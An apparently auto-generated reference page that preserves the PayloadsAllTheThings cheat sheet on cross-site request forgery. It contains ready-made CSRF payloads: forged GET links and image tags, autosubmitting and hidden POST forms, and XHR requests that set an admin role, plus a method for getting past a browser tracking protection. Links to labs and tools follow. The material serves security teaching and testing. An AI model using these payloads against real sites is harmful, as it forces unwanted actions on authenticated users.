---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Cross-Site Request Forgery

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-cross-site-request-forgery-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Cross-Site Request Forgery/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Cross-Site Request Forgery](../../topics/cross-site-request-forgery/cross-site-request-forgery.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-cross-site-request-forgery-readme |
| name | Cross-Site Request Forgery |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Cross-Site%20Request%20Forgery/README.md |

## Preserved Source Material

````yaml
_body: "# Cross-Site Request Forgery\n\n> Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute\
  \ unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing\
  \ requests, not theft of data, since the attacker has no way to see the response to the forged request. - OWASP\n\n## Summary\n\
  \n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)\n\
  \    * [HTML GET - No User Interaction](#html-get---no-user-interaction)\n    * [HTML POST - Requiring User Interaction](#html-post---requiring-user-interaction)\n\
  \    * [HTML POST - AutoSubmit - No User Interaction](#html-post---autosubmit---no-user-interaction)\n    * [HTML POST -\
  \ multipart/form-data With File Upload - Requiring User Interaction](#html-post---multipartform-data-with-file-upload---requiring-user-interaction)\n\
  \    * [JSON GET - Simple Request](#json-get---simple-request)\n    * [JSON POST - Simple Request](#json-post---simple-request)\n\
  \    * [JSON POST - Complex Request](#json-post---complex-request)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\
  \n* [0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe) - The Prime Cross Site Request Forgery Audit and Exploitation\
  \ Toolkit.\n\n## Methodology\n\n![CSRF_cheatsheet](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cross-Site%20Request%20Forgery/Images/CSRF-CheatSheet.png)\n\
  \nWhen you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a\
  \ cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie\
  \ is sent along with the request and the request is handled as if the logged in user performed it.\n\n### HTML GET - Requiring\
  \ User Interaction\n\n```html\n<a href=\"http://www.example.com/api/setusername?username=CSRFd\">Click Me</a>\n```\n\n###\
  \ HTML GET - No User Interaction\n\n```html\n<img src=\"http://www.example.com/api/setusername?username=CSRFd\">\n```\n\n\
  ### HTML POST - Requiring User Interaction\n\n```html\n<form action=\"http://www.example.com/api/setusername\" enctype=\"\
  text/plain\" method=\"POST\">\n <input name=\"username\" type=\"hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"\
  Submit Request\" />\n</form>\n```\n\n### HTML POST - AutoSubmit - No User Interaction\n\n```html\n<form id=\"autosubmit\"\
  \ action=\"http://www.example.com/api/setusername\" enctype=\"text/plain\" method=\"POST\">\n <input name=\"username\" type=\"\
  hidden\" value=\"CSRFd\" />\n <input type=\"submit\" value=\"Submit Request\" />\n</form>\n \n<script>\n document.getElementById(\"\
  autosubmit\").submit();\n</script>\n```\n\n### HTML POST - multipart/form-data With File Upload - Requiring User Interaction\n\
  \n```html\n<script>\nfunction launch(){\n    const dT = new DataTransfer();\n    const file = new File( [ \"CSRF-filecontent\"\
  \ ], \"CSRF-filename\" );\n    dT.items.add( file );\n    document.xss[0].files = dT.files;\n\n    document.xss.submit()\n\
  }\n</script>\n\n<form style=\"display: none\" name=\"xss\" method=\"post\" action=\"<target>\" enctype=\"multipart/form-data\"\
  >\n<input id=\"file\" type=\"file\" name=\"file\"/>\n<input type=\"submit\" name=\"\" value=\"\" size=\"0\" />\n</form>\n\
  <button value=\"button\" onclick=\"launch()\">Submit Request</button>\n```\n\n### JSON GET - Simple Request\n\n```html\n\
  <script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"GET\", \"http://www.example.com/api/currentuser\");\nxhr.send();\n\
  </script>\n```\n\n### JSON POST - Simple Request\n\nWith XHR :\n\n```html\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"\
  POST\", \"http://www.example.com/api/setrole\");\n//application/json is not allowed in a simple request. text/plain is the\
  \ default\nxhr.setRequestHeader(\"Content-Type\", \"text/plain\");\n//You will probably want to also try one or both of\
  \ these\n//xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n//xhr.setRequestHeader(\"Content-Type\"\
  , \"multipart/form-data\");\nxhr.send('{\"role\":admin}');\n</script>\n```\n\nWith autosubmit send form, which bypasses\
  \ certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection)\
  \ in Firefox browser :\n\n```html\n<form id=\"CSRF_POC\" action=\"www.example.com/api/setrole\" enctype=\"text/plain\" method=\"\
  POST\">\n// this input will send : {\"role\":admin,\"other\":\"=\"}\n <input type=\"hidden\" name='{\"role\":admin, \"other\"\
  :\"'  value='\"}' />\n</form>\n<script>\n document.getElementById(\"CSRF_POC\").submit();\n</script>\n```\n\n### JSON POST\
  \ - Complex Request\n\n```html\n<script>\nvar xhr = new XMLHttpRequest();\nxhr.open(\"POST\", \"http://www.example.com/api/setrole\"\
  );\nxhr.withCredentials = true;\nxhr.setRequestHeader(\"Content-Type\", \"application/json;charset=UTF-8\");\nxhr.send('{\"\
  role\":admin}');\n</script>\n```\n\n## Labs\n\n* [PortSwigger - CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)\n\
  * [PortSwigger - CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)\n\
  * [PortSwigger - CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)\n\
  * [PortSwigger - CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)\n\
  * [PortSwigger - CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)\n\
  * [PortSwigger - CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)\n\
  * [PortSwigger - CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)\n\
  * [PortSwigger - CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)\n\
  \n## References\n\n* [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3, 2016](https://web.archive.org/web/20220926223539/https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)\n\
  * [Cross-Site Request Forgery (CSRF) - OWASP - April 19, 2024](https://web.archive.org/web/20120920091432/https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))\n\
  * [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton - July 26, 2015](https://web.archive.org/web/20170919181010/https://whitton.io/articles/messenger-site-wide-csrf/)\n\
  * [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial - July 19,\
  \ 2016](https://web.archive.org/web/20170607102958/https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)\n\
  * [Hacking PayPal Accounts with one click (Patched) - Yasser Ali - October 9, 2014](https://web.archive.org/web/20141203184956/http://yasserali.com/hacking-paypal-accounts-with-one-click/)\n\
  * [Add tweet to collection CSRF - Vijay Kumar (indoappsec) - November 21, 2015](https://web.archive.org/web/20250519092910/https://hackerone.com/reports/100820)\n\
  * [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd - October 16, 2015](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)\n\
  * [How I Hacked Your Beats Account? Apple Bug Bounty - Aaditya Purani (@aaditya_purani) - July 20, 2016](https://web.archive.org/web/20250504102847/https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)\n\
  * [FORM POST JSON: JSON CSRF on POST Heartbeats API - Eugene Yakovchuk - July 2, 2017](https://web.archive.org/web/20180102010752/https://hackerone.com/reports/245346)\n\
  * [Hacking Facebook accounts using CSRF in Oculus-Facebook integration - Josip Franjkovic - January 15, 2018](https://web.archive.org/web/20260208211335/https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)\n\
  * [Cross Site Request Forgery (CSRF) - Sjoerd Langkemper - January 9, 2019](https://web.archive.org/web/20250906213239/https://www.sjoerdlangkemper.nl/2019/01/09/csrf/)\n\
  * [Cross-Site Request Forgery Attack - PwnFunction - April 5, 2019](https://web.archive.org/web/20251127000352/https://www.youtube.com/watch?v=eWEgUcHPle0)\n\
  * [Wiping Out CSRF - Joe Rozner - October 17, 2017](https://web.archive.org/web/20250727045637/https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)\n\
  * [Bypass Referer Check Logic for CSRF - hahwul - October 11, 2019](https://web.archive.org/web/20250719144921/https://www.hahwul.com/2019/10/11/bypass-referer-check-logic-for-csrf/)"
_relative_path: Cross-Site Request Forgery/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Cross-Site Request Forgery/README.md
````
